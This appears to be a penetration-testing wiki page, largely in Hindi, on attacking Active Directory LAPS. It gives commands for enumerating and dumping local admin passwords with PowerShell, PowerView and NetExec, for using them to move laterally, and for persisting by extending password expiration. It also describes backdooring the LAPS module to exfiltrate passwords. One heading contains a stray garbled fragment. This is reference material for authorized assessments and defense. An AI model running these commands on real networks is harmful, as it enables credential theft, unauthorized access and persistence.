# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

किसी assessment के दौरान आपको वर्तमान में **2 LAPS flavours** मिल सकते हैं:

- **Legacy Microsoft LAPS**: local administrator password को **`ms-Mcs-AdmPwd`** में और expiration time को **`ms-Mcs-AdmPwdExpirationTime`** में store करता है।
- **Windows LAPS** (April 2023 updates के बाद से Windows में built-in): अभी भी legacy mode को emulate कर सकता है, लेकिन native mode में यह **`msLAPS-*`** attributes का उपयोग करता है और **password encryption**, **password history** तथा domain controllers के लिए **DSRM password backup** support करता है।

LAPS को **local administrator passwords** manage करने के लिए design किया गया है, जिससे domain-joined computers पर ये passwords **unique, randomized और frequently changed** रहते हैं। यदि आप उन attributes को read कर सकते हैं, तो आमतौर पर affected host पर **local admin के रूप में pivot** कर सकते हैं। कई environments में महत्वपूर्ण बात केवल password को read करना नहीं है, बल्कि यह पता लगाना भी है कि password attributes तक access **किसे delegated किया गया है**।

### Legacy Microsoft LAPS attributes

Domain के computer objects में, Legacy Microsoft LAPS implementation के कारण दो attributes जुड़ जाते हैं:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS computer objects में कई नए attributes जोड़ता है:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: encryption enabled न होने पर JSON के रूप में stored clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers के लिए encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: Windows Server 2025 forest schema में newer rollback-detection logic द्वारा उपयोग की जाने वाली GUID-based version tracking

जब **`msLAPS-Password`** readable होता है, तो value एक JSON object होती है जिसमें account name, update time और clear-text password शामिल होते हैं, उदाहरण के लिए:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### जाँचें कि सक्रिय है_EDEFAULT
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

आप `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` से **raw LAPS policy** को **download** कर सकते हैं और फिर इस file को human-readable format में बदलने के लिए [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package से **`Parse-PolFile`** का उपयोग कर सकते हैं।

### Legacy Microsoft LAPS PowerShell cmdlets

यदि legacy LAPS module installed है, तो निम्नलिखित cmdlets आमतौर पर उपलब्ध होते हैं:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS एक नए PowerShell module और नए cmdlets के साथ आता है:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
यहां कुछ operational details महत्वपूर्ण हैं:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** अपने-आप **legacy LAPS**, **clear-text Windows LAPS**, और **encrypted Windows LAPS** को handle करता है।
- यदि password encrypted है और आप उसे **read** कर सकते हैं, लेकिन **decrypt** नहीं कर सकते, तो cmdlet **`Source`**, **`DecryptionStatus`**, और **`AuthorizedDecryptor`** जैसे metadata लौटाता है, भले ही वह clear-text password न लौटा सके।
- **encrypted Windows LAPS** में **read permission** और **decrypt permission** **अलग controls** हैं। OU / object पर read access होने का यह अर्थ अपने-आप नहीं है कि आप **`msLAPS-EncryptedPassword`** को decrypt कर सकते हैं।
- **Password history** केवल तब उपलब्ध होती है जब **Windows LAPS encryption** enabled हो।
- Domain controllers पर, लौटाया गया source **`EncryptedDSRMPassword`** हो सकता है।

Assessment के दौरान यह उपयोगी है, क्योंकि **`AuthorizedDecryptor`** field बताती है कि blob किस user या group के लिए encrypted था। इससे अक्सर failed password read को privilege-escalation के नए target में बदला जा सकता है।

### PowerView / LDAP

**PowerView** का उपयोग यह पता लगाने और password read करने के लिए भी किया जा सकता है कि password को कौन read कर सकता है:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
यदि **`msLAPS-Password`** readable है, तो लौटाए गए JSON को parse करें और password के लिए **`p`** तथा managed local admin account name के लिए **`n`** निकालें।
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
वह **`n`** field नए deployments में महत्वपूर्ण है क्योंकि **Windows LAPS automatic account management** built-in **`Administrator`** के बजाय **custom account** को target कर सकता है, और नए **Windows 11 24H2 / Windows Server 2025** systems उस account name को **randomize** भी कर सकते हैं।<sup>[[4]](#references)</sup>

### Linux / remote tooling

Modern tooling legacy Microsoft LAPS और Windows LAPS दोनों को support करता है.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- हाल के **NetExec** builds **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, और **`msLAPS-EncryptedPassword`** को support करते हैं।
- **`pyLAPS`** Linux से **legacy Microsoft LAPS** के लिए अभी भी उपयोगी है, लेकिन यह केवल **`ms-Mcs-AdmPwd`** को target करता है।
- नए cross-platform tooling जैसे **`LAPS4LINUX`**, **`dpapi-ng`**-based tooling, और हाल के **NetExec** workflows non-Windows hosts से **native Windows LAPS** को भी handle कर सकते हैं।
- यदि environment **encrypted Windows LAPS** का उपयोग करता है, तो एक simple LDAP read पर्याप्त नहीं है; आपको **authorized decryptor** (या equivalent decryption material, जैसे offline domain DPAPI-NG root key material) भी होना चाहिए।<sup>[[5]](#references)</sup>
- **Windows 11 24H2 / Windows Server 2025** पर यह assume न करें कि managed local admin हमेशा **`Administrator`** ही होगा। Automatic account management एक custom account बना सकता है और optionally उसका name randomize कर सकता है, इसलिए scale पर **`--laps`** का उपयोग करने से पहले **`n`** / **`Account`** के माध्यम से account name discover करें।<sup>[[4]](#references)</sup>

### Directory synchronization abuse

यदि आपके पास प्रत्येक computer object पर direct read access के बजाय domain-level **directory synchronization** rights हैं, तो भी LAPS interesting हो सकता है।

**`DS-Replication-Get-Changes`** को **`DS-Replication-Get-Changes-In-Filtered-Set`** या **`DS-Replication-Get-Changes-All`** के साथ combine करके legacy **`ms-Mcs-AdmPwd`** जैसे **confidential / RODC-filtered** attributes को synchronize किया जा सकता है। BloodHound इसे **`SyncLAPSPassword`** के रूप में model करता है। Replication-rights background के लिए [DCSync](dcsync.md) देखें।

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) कई functions के साथ LAPS enumeration को facilitate करता है।<sup>[[6]](#references)</sup>\
इनमें से एक **LAPS enabled सभी computers** के लिए **`ExtendedRights`** को parse करना है। यह विशेष रूप से उन **groups** को दिखाता है जिन्हें **LAPS passwords read करने के लिए delegated** किया गया है; इनमें अक्सर protected groups के users होते हैं।\
जो **account** किसी **computer** को domain से **join** करता है, उसे उस host पर `All Extended Rights` प्राप्त होते हैं, और यह right उस **account** को **passwords read** करने की ability देता है। Enumeration से ऐसा user account दिखाई दे सकता है जो किसी host पर LAPS password read कर सकता है। इससे हम ऐसे **specific AD users** को **target** करने में सहायता प्राप्त कर सकते हैं जो LAPS passwords read कर सकते हैं।
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec से LAPS Passwords Dump करना

यदि आपके पास interactive PowerShell नहीं है, तो आप LDAP के माध्यम से इस privilege का remotely abuse कर सकते हैं:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
यह उन सभी LAPS secrets को dump करता है जिन्हें user पढ़ सकता है, जिससे आप अलग local administrator password का उपयोग करके lateral movement कर सकते हैं।

## LAPS Password का उपयोग करना
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Expiration Date

एक बार admin बनने के बाद, **passwords प्राप्त करना** और **expiration date को भविष्य में सेट करके** किसी machine को अपना **password अपडेट करने से रोकना** संभव है।

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS इसके बजाय **`msLAPS-PasswordExpirationTime`** का उपयोग करता है:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> यदि कोई **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** का उपयोग करता है, या **Do not allow password expiration time longer than required by policy** सक्षम है, तो password फिर भी rotate होगा।

### नए Windows LAPS पर snapshot rollback संबंधी सावधानी

पुराने snapshot / image rollback tricks हाल के **Windows LAPS** deployments के विरुद्ध **कम विश्वसनीय** हैं। **Windows 11 24H2 / Windows Server 2025** पर, यदि forest schema में **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**) शामिल है, तो client स्थानीय रूप से cached GUID की तुलना AD में stored value से करता है और rollback के कारण **torn state** बनने पर **तुरंत password rotate** कर देता है।

व्यवहार में, इसका अर्थ है कि snapshot-based persistence या किसी पुराने ज्ञात local admin password को पुनर्जीवित करने के प्रयास जल्दी निष्फल हो सकते हैं, बजाय इसके कि वे अगले सामान्य expiration तक बने रहें।<sup>[[2]](#references)</sup>

यह protection केवल **AD-backed Windows LAPS** पर लागू होती है और यह भी आवश्यक है कि reverted machine **AD से दोबारा authenticate** कर सके। यदि machine अब AD से communicate नहीं कर सकती, तो **password history** या **AD backup access** अभी भी मदद कर सकते हैं।

### Automatic account management tamper संबंधी सावधानी

जब **automatic account management** सक्षम होता है, तो Windows LAPS managed local admin account के lifecycle का नियंत्रण रखता है। उस account का नाम बदलने, उसे reconfigure करने या किसी अन्य प्रकार से tamper करने के अप्रत्याशित प्रयास **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** के साथ reject किए जा सकते हैं। इसलिए managed LAPS account को चुपचाप modify करने पर निर्भर persistence नए endpoints पर कम विश्वसनीय है।<sup>[[4]](#references)</sup>

### AD backups से historical passwords recover करना

जब **Windows LAPS encryption + password history** सक्षम हो, तो mounted AD backups secrets का एक अतिरिक्त source बन सकते हैं। यदि आप mounted AD snapshot access कर सकते हैं और **recovery mode** का उपयोग कर सकते हैं, तो live DC से communicate किए बिना पुराने stored passwords query कर सकते हैं।<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
यह मुख्य रूप से **AD backup theft**, **offline forensics abuse**, या **disaster-recovery media access** के दौरान प्रासंगिक है।

### Backdoor

legacy Microsoft LAPS का original source code [यहाँ](https://github.com/GreyCorbel/admpwd) पाया जा सकता है, इसलिए code में एक backdoor डालना संभव है (उदाहरण के लिए `Main/AdmPwd.PS/Main.cs` में `Get-AdmPwdPassword` method के अंदर), जो किसी तरह **नए passwords को exfiltrate करे या उन्हें कहीं store करे**।

फिर नए `AdmPwd.PS.dll` को compile करें और उसे `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` में machine पर upload करें (और modification time बदलें)।

## References

- [1] [Microsoft LAPS का परिचय – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows Server Active Directory के लिए Windows LAPS schema और rights extensions](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Windows Server Active Directory के साथ Windows LAPS और Windows Server Active Directory शुरू करें](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
